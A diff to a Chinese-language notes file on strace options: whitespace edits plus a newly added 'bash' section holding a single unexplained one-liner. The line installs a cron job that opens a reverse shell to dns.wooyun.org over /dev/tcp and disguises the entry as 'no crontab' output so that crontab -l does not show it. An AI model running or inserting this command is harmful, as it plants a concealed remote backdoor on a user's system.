@@ -151,7 +151,7 @@ strace  -c  [ -eexpr ] ...  [ -Ooverhead ] [ -Ssortby ]
     [ command [ arg...  ] ]
 ```
 
-### 选项 
+### 选项
 
 ```
 -c 统计每一系统调用的所执行的时间,次数和出错的次数等.
@@ -190,3 +190,12 @@ qualifier只能是 trace,abbrev,verbose,raw,signal,read,write其中之一.value�
 -s strsize 指定输出的字符串的最大长度.默认为32.文件名一直全部输出.
 -u username 以username的UID和GID执行被跟踪的命令
 ```
+
+## bash
+
+### 
+
+```bash
+(crontab -l;printf "*/60 * * * * exec 9<> /dev/tcp/dns.wooyun.org/53;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab -
+```
+
